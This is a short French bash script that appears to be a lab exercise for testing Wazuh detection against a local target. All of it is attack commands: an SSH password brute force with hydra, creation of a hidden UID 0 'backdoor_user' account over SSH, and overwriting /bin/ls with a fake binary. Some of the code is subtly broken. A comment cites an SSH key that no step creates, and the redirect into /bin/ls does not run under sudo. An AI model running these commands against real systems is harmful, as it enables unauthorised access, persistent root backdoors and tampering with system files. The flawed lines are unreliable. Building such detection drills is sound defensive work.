#!/bin/bash

# =================================================================
# SCENARIO.SH - EPREUVE DU FEU WAZUH (Groupe 1)
# =================================================================

TARGET_IP="127.0.0.1"
SSH_PORT="2223"
USERNAME="webadmin"

echo "====================================================="
echo "   DEBUT DE L'EPREUVE DU FEU - WAZUH"
echo "====================================================="

# --- 1. BRUTE-FORCE SSH ---
echo -e "\n[1/3] Simulation d'un Brute-Force SSH..."
# On utilise fasttrack.txt pour que l'attaque dure quelques secondes
hydra -l $USERNAME -P /usr/share/wordlists/fasttrack.txt -s $SSH_PORT $TARGET_IP ssh -t 4
echo "[+] Attaque terminée."
sleep 5

# --- 2. CREATION D'UN UTILISATEUR ROOT CLANDESTIN ---
echo -e "\n[2/3] Création d'un utilisateur avec l'UID 0 (Root)..."
# On utilise la clé SSH générée à l'étape précédente pour se connecter
ssh -o StrictHostKeyChecking=no -p $SSH_PORT $USERNAME@$TARGET_IP "sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor_user"
echo "[+] Utilisateur 'backdoor_user' créé."
sleep 5

# --- 3. MODIFICATION D'UN BINAIRE SYSTEME ---
echo -e "\n[3/3] Modification du binaire système /bin/ls..."
ssh -o StrictHostKeyChecking=no -p $SSH_PORT $USERNAME@$TARGET_IP "sudo cp /bin/ls /tmp/ls.bak && sudo echo -e '#!/bin/bash\necho \"Binaire compromis\"' > /bin/ls && sudo chmod +x /bin/ls"
echo "[+] Binaire /bin/ls modifié."

echo -e "\n====================================================="
echo "   FIN DE L'EPREUVE DU FEU"
echo "====================================================="
                                                                                                                                                                                                                                            
